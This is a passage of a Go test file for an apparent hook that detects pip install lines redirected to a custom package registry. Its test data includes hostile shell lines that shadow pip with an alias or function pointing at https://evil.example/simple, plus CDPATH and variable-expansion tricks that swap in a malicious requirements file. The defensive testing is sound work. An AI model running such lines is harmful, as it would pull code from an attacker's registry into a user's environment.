			t.Errorf("%q: %q, want %q", line, why, want)
		}
	}
	// a nested ~ from a file is unplaced too once the line may have moved HOME
	writeFiles(t, cwd, map[string]string{"n.txt": "-r ~/r.txt\n"})
	if why := reqFileHold(cwd, home, "pip install -r n.txt", nil); !strings.Contains(why, "custom registry") {
		t.Errorf("nested ~: %q", why)
	}
	if why := reqFileHold(cwd, home, "echo $X; pip install -r n.txt", nil); !strings.Contains(why, "cannot place") {
		t.Errorf("nested ~ after a $: %q", why)
	}
	for line, want := range map[string]bool{"a$": true, "'$'": false, `\$`: false, `"\$"`: false, `"$"`: true, `'a'$`: true,
		`"'$'"`: true, "a": false} {
		if dollarOutsideSingle(line) != want {
			t.Errorf("dollarOutsideSingle(%q) != %v", line, want)
		}
	}
}

// Round 19 (P2-H): an indexed array's subscript is arithmetic, which assigns with no $ and no parenthesis — on a line
// with a literal cd to place, a word with a [ and then an = outside single quotes holds, and so do test -v and [ -v.
func TestReqFileRound19(t *testing.T) {
	cwd := t.TempDir()
	writeFiles(t, cwd, map[string]string{"r.txt": "zz-req-pkg\n", "sub/r.txt": evilIndex})
	for line, want := range map[string]string{
		"a[CDPATH=1]=x; cd sub && pip install -r r.txt":                   "an array subscript that can assign",
		"export a[CDPATH++]=x; cd sub && pip install -r r.txt":            "an array subscript that can assign",
		`cd sub && pip install -r r.txt "zz[x]==1"`:                       "an array subscript that can assign", // the rule's cost
		`test -v "a[CDPATH]" && cd sub && pip install -r r.txt`:           "the line also runs test -v",
		`[ -v x ] && cd sub && pip install -r r.txt`:                      "the line also runs [ -v",
		"cd sub && pip install -r r.txt 'zz[x]==1'":                       "custom registry", // single quotes
		`[ -d sub ] && cd sub && PIP_NO_INPUT=1 pip install -r r.txt`:     "custom registry", // the [ word ends before the =
		`echo \[x=1] && cd sub && pip install -r r.txt`:                   "custom registry", // an escaped [
		`echo "a\"" [b] && cd sub && PIP_NO_INPUT=1 pip install -r r.txt`: "custom registry",
	} {
		why := reqFileHold(cwd, "", line, nil)
		if !strings.Contains(why, want) {
			t.Errorf("%q: %q, want %q", line, why, want)
		}
	}
	if why := reqFileHold(cwd, "", "a[CDPATH=1]=x pip install -r r.txt", nil); why != "" { // no cd: nothing to place
		t.Errorf("no cd: %q", why)
	}
}

// READER-SHADOW-1: the hook holds a line that shadows a command it reads, through the line reader (the server's
// reason) and its own requirements-file reading.
func TestReqFileShadow(t *testing.T) {
	cwd := t.TempDir()
	writeFiles(t, cwd, map[string]string{"r.txt": "zz-req-pkg\n"})
	for _, line := range []string{
		"pip() { command pip -i https://evil.example/simple \"$@\"; }; pip install -r r.txt",
		"alias pip='pip -i https://evil.example/simple'; pip install -r r.txt",
	} {
		if why := reqFileHold(cwd, "", line, nil); !strings.Contains(why, "defines an alias or a function (") {
			t.Errorf("%q: %q", line, why)
		}
		if !isInstall(line) {
			t.Errorf("%q: the hook does not send it", line)
		}
	}
	// round 19: any name holds; a line with no definition reads the file
	if why := reqFileHold(cwd, "", "alias ll='ls -la'; pip install -r r.txt", nil); !strings.Contains(why, "(alias ll)") {
		t.Errorf("an alias of another name: %q", why)
	}
	if why := reqFileHold(cwd, "", "echo 'pip() { :; }'; pip install -r r.txt", nil); why != "" {
		t.Errorf("a quoted definition: %q", why)
	}
}

// READER-EXPANSION-ENV-1 (ADR-0159 round 26): ${NAME:=word} on the line sets NAME as an export does, for pip's
// ${NAME} in a requirements file.
func TestReqFileExpansionAssign(t *testing.T) {
	cwd := t.TempDir()
	writeFiles(t, cwd, map[string]string{"r.txt": "-r ${ZZ_F}\n", "evil.txt": evilIndex, "ok.txt": "zz-req-pkg\n"})
	env := func(k string) string {
		if k == "ZZ_F" {
			return "ok.txt"
		}
		return ""
	}
	if why := reqFileHold(cwd, "", "pip install -r r.txt", env); why != "" {
		t.Errorf("the hook's own ZZ_F: %q", why)
	}
	for _, line := range []string{
		": ${ZZ_F:=evil.txt}; export ZZ_F; pip install -r r.txt",
		"set -a; : ${ZZ_F=evil.txt}; pip install -r r.txt",
		"set -a; Y=${ZZ_F:=evil.txt} pip install -r r.txt", // in a VAR=value word
	} {
		if why := reqFileHold(cwd, "", line, func(string) string { return "" }); !strings.Contains(why, "custom registry") {
			t.Errorf("%q: %q", line, why)
		}
	}
}
